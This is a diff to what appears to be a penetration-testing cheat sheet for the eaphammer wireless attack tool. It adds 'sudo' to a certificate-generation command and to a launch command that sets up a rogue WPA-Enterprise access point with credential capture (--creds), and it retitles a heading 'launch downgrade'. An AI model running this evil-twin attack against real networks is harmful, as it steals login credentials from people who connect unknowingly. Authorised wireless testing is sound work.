@@ -23,10 +23,10 @@ https://github.com/s0lst1c3/eaphammer/wiki
 
 ## generate certificate
 ```bash
-eaphammer --cert-wizard
+sudo eaphammer --cert-wizard
 ```
 
-## launch
+## launch downgrade
 ```bash
-eaphammer --interface <wlan_interface|wlan0> --negotiate <nego_method|balanced> --auth wpa-eap --essid <essid> --creds
+sudo eaphammer --interface <wlan_interface|wlan0> --negotiate <nego_method|balanced> --auth wpa-eap --essid <essid> --creds
 ```
